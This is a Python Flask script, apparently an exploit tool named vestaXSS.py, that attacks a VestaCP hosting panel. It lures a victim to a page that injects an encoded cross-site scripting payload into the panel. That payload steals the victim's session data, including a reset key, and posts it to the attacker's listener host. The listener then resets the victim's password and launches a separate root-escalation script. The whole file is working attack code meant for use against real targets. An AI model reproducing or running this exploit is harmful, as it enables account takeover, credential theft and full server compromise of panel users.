from flask import Flask,request
from flask_cors import CORS, cross_origin
from VestaFuncs import *
import os
import sys


if len(sys.argv) == 4:
	targetHost   = sys.argv[1]
	listenerPort = sys.argv[3]
	listenerHost = sys.argv[2]+':'+str(listenerPort)
else:
	print("Usage\npython3 vestaXSS.py https://target_host:8083 https://listener_host listener_Port")
	exit()

## New self signed SSL cert
#os.system("openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365")

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

@app.route("/")
def helloWorld():
	return "Hello"


@app.route("/exploit.html")
def exploit():
	JSsploit = '''fetch("/api/v1/login/session.php",{}).then(function (response) {
       return response.json();
}).then(function (ajson) {
	fetch("'''+listenerHost+'''/listener", {
	    method: 'POST',
	    headers: {
	      'Accept': 'application/json',
	      'Content-Type': 'application/json'
	    },
	    body: JSON.stringify(ajson)
  	});
});
'''
	return '<script>document.location="'+targetHost+'/api/v1/edit/web/index.php?domain=%3Csvg%20onload=eval(atob(location.hash.slice(1)))%3E#'+b64en(JSsploit)+'"</script>'

@app.route("/listener", methods=['GET', 'POST'])
@cross_origin()
def listener():
	payload = request.json
	if payload['data']['HOME']:
		tUser = payload['user']
		print('[+] New request received :'+tUser)
		if payload['data']['HOME'] == '/home/admin':
			print('[+] Admin account found')

		if payload['data']['RKEY']:
			print('[+] RKEY Found '+payload['data']['RKEY']+'\n[+] Reseting password for '+tUser)
			newUserPassword = resetPassword(tUser,targetHost, payload['data']['RKEY'])
			if(newUserPassword):
				print('[+] New '+tUser+' account password :' +newUserPassword)
				os.system('python3 vestaROOT.py '+targetHost+ ' ' + tUser + ' '+newUserPassword)
	return (payload)


if __name__ == '__main__':
	print('[!] Send this link to your target : '+listenerHost+'/exploit.html')
	app.run(debug=False, port=listenerPort, host='0.0.0.0', ssl_context=("cert.pem", "key.pem"))
